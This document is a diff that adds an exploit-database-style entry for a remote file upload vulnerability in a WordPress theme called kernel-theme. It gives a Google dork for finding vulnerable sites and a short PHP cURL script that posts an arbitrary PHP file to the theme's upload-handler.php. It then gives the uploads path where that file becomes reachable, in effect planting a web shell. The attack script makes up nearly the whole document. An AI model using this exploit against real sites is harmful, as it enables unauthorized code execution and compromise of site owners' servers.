@@ -1,0 +1,36 @@
+###################################################################################################
+# Exploit Title: WordPress themekernel-theme Themes Remote File Upload Vulnerability
+# Author: iskorpitx
+# Date: 6/11/2013
+# Vendor Homepage: http://www.wikmag.com/
+# Themes Link: http://themeforest.net/item/kernel-premium-wordpress-blog-magazine-theme-/857077
+# Infected File: upload-handler.php
+# Category: webapps
+# Google dork: inurl:/wp-content/themes/kernel-theme/
+# Tested on : Windows/Linux
+###################################################################################################
+
+# Exploit
+
+
+<?php 
+$uploadfile="upload.php"; 
+$ch = curl_init("http://127.0.0.1/wp-content/themes/kernel-theme/functions/upload-handler.php"); 
+curl_setopt($ch, CURLOPT_POST, true); 
+curl_setopt($ch, CURLOPT_POSTFIELDS,
+        array('orange_themes'=>"@$uploadfile")); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
+$postResult = curl_exec($ch); 
+curl_close($ch); print "$postResult"; 
+?>
+
+http://127.0.0.1/wordpress/wp-content/uploads/2013/11/upload.php
+
+
+
+
+All http://www.mavi1.org members
+
+
+
+
+
